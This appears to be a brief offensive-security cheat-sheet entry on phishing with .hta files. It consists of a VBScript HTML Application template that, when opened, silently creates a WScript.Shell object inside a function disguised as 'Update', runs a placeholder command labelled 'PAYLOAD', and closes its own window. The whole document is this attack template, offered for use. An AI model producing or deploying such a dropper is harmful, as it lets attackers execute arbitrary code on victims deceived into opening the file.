# Phishing

## .hta phishing

```vbscript
<script language="VBScript">
  Function Update()
    Dim yz
    Set yz = CreateObject("Wscript.Shell")
    yz.run "PAYLOAD"
    Set yz = Nothing
  End Function
  
  Update
  self.close
</script>
```
